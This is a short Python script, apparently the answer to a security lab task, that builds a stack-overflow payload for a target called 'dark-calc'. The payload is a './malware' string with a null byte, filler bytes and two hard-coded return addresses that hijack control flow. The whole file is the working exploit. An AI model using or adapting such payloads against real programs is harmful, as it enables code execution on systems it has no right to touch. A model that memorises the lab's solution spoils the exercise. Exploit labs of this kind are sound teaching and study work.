#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"./malware\x00"
payload += b"A" * 14
payload += b"\xd6\x19\x40\x00\x00\x00\x00\x00"   # 0x4019d6
payload += b"\xe0\x17\x40\x00\x00\x00\x00\x00"   # 0x4017e0
payload += b"\x0a"

sys.stdout.buffer.write(payload)
